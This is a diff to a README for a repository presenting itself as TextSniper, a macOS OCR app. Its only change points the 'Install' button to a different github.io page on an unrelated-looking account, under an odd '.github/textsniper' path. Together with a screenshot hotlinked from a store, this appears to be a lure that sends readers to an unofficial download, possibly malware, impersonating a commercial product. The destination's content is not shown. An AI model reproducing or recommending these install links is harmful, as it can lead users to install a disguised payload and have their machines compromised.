@@ -2,7 +2,7 @@
 <h1 align="center">TextSniper</h1>
 <p align="center">Native OCR text capture — done right on macOS.</p>
 <p align="center"><img src="https://img.shields.io/badge/macOS-000000?style=flat-square&logo=apple&logoColor=white"/> &nbsp; <img src="https://img.shields.io/badge/Apple_Silicon-Ready-brightgreen?style=flat-square"/> &nbsp; <img src="https://img.shields.io/badge/Dark_Mode-Supported-blueviolet?style=flat-square"/></p>
-<p align="center"><a href="https://4eboksari-4ebur.github.io/.github/textsniper"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
+<p align="center"><a href="https://jornal-gens.github.io/.github/textsniper"><img src="https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png" alt="Install" width="160"/></a></p>
 <p align="center"><img src="https://cdnp2.stackassets.com/fb555f7443cfe6f90afefa2ac1d69a0374a17fad/store/b5bd99e37da4b6e72ba25ecb781cc7808bb23f629693536dda1a8a556b0e/product_248133_product_shots1.jpg" alt="TextSniper — macOS OCR text capture screenshot" width="780"/></p>
 
 ---
